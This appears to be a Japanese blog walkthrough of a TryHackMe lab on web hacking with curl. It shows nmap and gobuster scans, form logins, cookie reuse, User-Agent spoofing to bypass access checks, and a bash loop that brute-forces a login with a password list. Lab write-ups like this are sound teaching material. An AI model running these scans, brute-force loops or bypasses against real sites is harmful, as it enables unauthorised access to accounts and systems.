---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: Web Hacking Using cURL (AoC2025 W8) Walkthrough"
date: 2026-01-13T00:00:00+09:00
aliases: ["/TryHackMe/webhacking-using-curl"]
tags: ["TryHackMe", "CTF", "walkthrough", "curl", "Web", "AoC2025"]
categories: ["TryHackMe"]
draft: true
cover:
    image: "/images/eyecatch/TryHackMe/webhacking-using-curl/index.png"
---

# このページでわかること

* TryHackMe ルーム「Web Hacking Using cURL (AoC2025 W8)」のWalkthrough
* curl を使った GET / POST リクエストの基礎
* Cookie の保存と再利用によるセッション管理
* bash ループを使ったシンプルなブルートフォース
* User-Agent 偽装によるアクセス制限のバイパス

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | Web Hacking Using cURL (AoC2025 W8) |
| 難易度 | Easy |
| カテゴリ | Web |
| URL | https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0 |

# 執筆時の環境

* OS: Ubuntu (TryHackMe AttackBox)
* ツール: nmap, gobuster, curl, bash

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0)
* [curl 公式ドキュメント](https://curl.se/docs/manpage.html)

---

# 1. ポートスキャン

## 1-1. TCP ポートスキャン

```bash
nmap -sT -P0 $IP
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 1-2. port 22 / 80 詳細スキャン

| ポート | サービス | バージョン |
|--------|----------|------------|
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP | Apache httpd 2.4.52 (Ubuntu) |

## 1-3. 重要な発見 — HTTP バージョンの挙動差異

ブラウザ（HTTP/1.1）でアクセスすると以下のメッセージが返される。

```
Access denied. Please use your terminal.
```

一方、curl のデフォルト（HTTP/1.1）でも同様に拒否されるため、アクセス方法に工夫が必要な設計になっている。
このルームは curl での操作を前提として設計されており、ブラウザ経由のアクセスを意図的にブロックしている。

## 1-4. port 80 脆弱性スキャン

```bash
nmap -p 22,80 --script vuln $IP
```

* CSRF・XSS・DOM XSS いずれも検出されなかった

---

# 2. ディレクトリ列挙

## 2-1. /etc/hosts への登録

アクセスには IP ではなくホスト名 `nmap.org` が必要な設計になっている。

```bash
echo "$IP nmap.org" >> /etc/hosts
```

## 2-2. gobuster でディレクトリ列挙

```bash
gobuster dir -u 'http://nmap.org' -w /usr/share/wordlists/dirb/common.txt -t 200
```

| パス | ステータス |
|------|-----------|
| /index.php | 200 |
| /.htaccess | 403 |
| /server-status | 403 |

* gobuster では `post.php` は直接列挙されなかった
* curl で GET リクエストを送ったレスポンス本文にヒントが記載されていた（次節参照）

---

# 3. curl 基礎操作

## 3-1. GET リクエスト

```bash
curl -X GET http://nmap.org
```

```
Welcome to the cURL practice server!
Try sending a POST request to /post.php
```

レスポンス本文に次のステップへのヒントが含まれていた。gobuster で見つからなかった `post.php` の存在がここで判明する。

## 3-2. POST リクエスト — フラグ取得

まず GET で `post.php` にアクセスして使い方を確認する。

```bash
curl -X GET http://nmap.org/post.php
```

```
Send POST data like username=admin&password=admin
```

続いて指示どおり POST データを送信する。

```bash
curl -X POST http://nmap.org/post.php -d 'username=admin&password=admin'
```

```
Login successful!
Flag: THM{...}
```

`-d` オプションを使うと `Content-Type: application/x-www-form-urlencoded` が自動的に付与され、フォームデータとしてサーバに送信される。

---

# 4. Cookie の保存と再利用

## 4-1. ログインして Cookie を保存

`-c COOKIEFILE` オプションでレスポンスの Set-Cookie を指定ファイルに保存できる。

```bash
curl -c cookies.txt -d "username=admin&password=admin" http://$IP/session.php
```

```
Login successful. Cookie set.
```

## 4-2. 保存した Cookie を使って再アクセス — フラグ取得

`-b COOKIEFILE` オプションで保存済み Cookie をリクエストに付与する。

```bash
curl -b cookies.txt http://$IP/session.php
```

```
Welcome back, admin!
Flag: THM{...}
```

Cookie が有効な間はパスワードを再入力せずに認証済み状態でアクセスできる。
`-c` で保存・`-b` で読み込みという使い分けを覚えておくと、セッション管理が絡む検査で役立つ。

---

# 5. bash ループでブルートフォース

## 5-1. パスワードリストの準備

```
admin123
password
letmein
secretpass
secret
```

## 5-2. ループによる自動試行

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://$IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

```
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass
```

* `curl -s` でサイレントモード（プログレスバーを非表示）にしてスクリプト内で扱いやすくする
* `grep -q` はマッチしても標準出力に出力しない。終了コードだけを返すため条件分岐に使いやすい
* `break` でパスワードが見つかった時点でループを抜ける

---

# 6. User-Agent 偽装

## 6-1. デフォルト UA では 403 が返る

```bash
curl -i http://$IP/ua_check.php
```

```
HTTP/1.1 403 Forbidden
Blocked: Only internalcomputer useragents are allowed.
```

サーバ側で User-Agent ヘッダーを検査しており、想定外の UA はブロックされる。

## 6-2. -A オプションで UA を偽装

`-A "文字列"` で任意の User-Agent を指定できる。

```bash
curl -A "internalcomputer" http://$IP/ua_check.php
```

```
Welcome Internal Computer!
```

## 6-3. AoC2025 ボーナス問題 — フラグ取得

```bash
curl -A 'TBFC' http://$IP/agent.php
```

```
Flag: THM{...}
```

UA 制限はサーバ側の簡易チェックに過ぎず、クライアントが任意の文字列を送れるため、セキュリティ上の保証にはならない。

---

# 7. フラグ取得

| 問題 | 取得方法 |
|------|----------|
| POST ログイン | `/post.php` に `-d` でフォームデータを POST |
| Cookie 再利用 | `-c` で保存した Cookie を `-b` で再送信 |
| UA 偽装 | `-A 'TBFC'` で `/agent.php` にアクセス |
| ブルートフォース正解パスワード | bash ループで `secretpass` を特定 |

フラグ値はすべて `THM{...}` の形式で取得できる。実際の値は伏せる。

---

# まとめ

本ルームでは curl を使った Web 操作の基礎を一通り体験できる。

| 習得内容 | 対応する curl オプション |
|----------|--------------------------|
| GET / POST リクエスト | `-X GET` / `-X POST` / `-d` |
| Cookie 保存・送信 | `-c FILE` / `-b FILE` |
| User-Agent 偽装 | `-A "文字列"` |
| サイレントモード | `-s` |
| レスポンスヘッダー確認 | `-i` |
| 任意ヘッダー追加 | `-H "Key: Value"` |
| リダイレクト追従 | `-L` |

curl はシンプルながら強力なツールであり、ペネトレーションテストや API 検査では欠かせない。特にスクリプトと組み合わせたブルートフォースや、Cookie・ヘッダー操作を用いたセッション検査は実務でも頻繁に使う手法である。

また本ルームで気づきにくいハマりポイントとして、以下の 2 点が挙げられる。

* `/etc/hosts` に `nmap.org` を登録しないとアクセスできない設計になっている
* gobuster だけでは `post.php` の存在が分からない — curl の GET レスポンス本文にヒントが埋め込まれていた
